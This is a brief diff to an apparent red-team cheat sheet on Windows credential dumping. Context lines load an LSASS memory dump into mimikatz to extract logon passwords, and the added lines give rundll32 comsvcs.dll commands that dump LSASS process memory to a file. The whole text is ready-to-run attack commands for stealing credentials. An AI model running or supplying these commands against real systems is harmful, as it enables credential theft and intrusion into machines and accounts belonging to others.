@@ -28,3 +28,11 @@ writes output to C:\Windows\temp\dumpert.dmp
 minikatz.exe
 sekurlsa::minidump C:\Windows\temp\dumpert.dmp
 sekurlsa::logonpasswords
+
+***** Dump LSASS with rundll32 *****
+rundll32.exe C:\Windows\System32\comsvcs.dll #24 "<PID> lsass.dmp full"
+rundll32.exe comsvcs.dll #24 "<PID> lsass.dmp full"
+@vysecurity 
+
+
+
